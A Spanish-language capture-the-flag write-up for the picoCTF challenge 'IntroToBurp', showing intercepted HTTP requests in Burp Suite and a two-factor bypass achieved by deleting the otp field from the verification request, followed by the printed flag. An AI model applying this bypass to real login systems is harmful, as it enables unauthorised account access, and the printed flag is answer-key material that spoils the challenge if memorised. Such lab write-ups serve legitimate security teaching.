# IntroToBurp

## Descripcion
Try [here](http://titan.picoctf.net:64701/) to find the flag
## Solucion
Nos conectamos al reto con el link que nos proporcionan.
Vemos que tenemos un formulario, lo llenamos con datos al azar y despues nos pide un factor de doble autenticacion. Cosa que no tenemos. Entonces vamosa  Burpsuite para ver como es que se forman las peticiones:
En la primera del formulario, no vemos nada raro
```
POST / HTTP/1.1
Host: titan.picoctf.net:64701
Content-Length: 208
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:64701
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:64701/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJjc3JmX3Rva2VuIjoiOGE1ODk0OTNlNjE3ZThiNmE3NjliYzdhZWU5NGU5OTExM2Y5NjZiZiJ9.Z-isSw.nZwUEMbDPuA_k8gVL7DZ7HJJWEc
Connection: keep-alive

csrf_token=IjhhNTg5NDkzZTYxN2U4YjZhNzY5YmM3YWVlOTRlOTkxMTNmOTY2YmYi.Z-isSw.IIKD2jQqkrofTn4dt_dNHxyONEQ&full_name=Mario&username=xrengariox&phone_number=0123456789&city=Zac&password=password123&submit=Register
```
Pero en la del 2FA vemos el campo de otp. Como no tenemos un otp, vamos a eliminar esto para ver que pasa, ademas de que en las pistas nos dice que posiblemente el sitio no maneja bien las solicitudes mal formadas:
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:64701
Content-Length: 18
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:64701
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:64701/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jEEOwiAQRe_C2kVpKTDewQu4IQMO2thCA21aY7y700R3_7-X_98iDMtLnMUVgziJUEt0S35SYmSxt6CgIy0NWa_RaPDBIBEoApCyi6C1j7yL6zi6hBPx7IJlyMzyMnOT0CjZcp2x1i2XG7N_lG13iEdO5NI6eSosG6aq18YCu7VS-d3uhdL9uN7F5wuC4Dem.Z-iseg.mFAEo71OsFt9RKXiBwn_NJOMk44
Connection: keep-alive

otp=asfsdfujhasjfd
```
Y al borrar la linea de otp obtenemos la flag:
```flag
picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```
## Notas adicionales

## Referencias
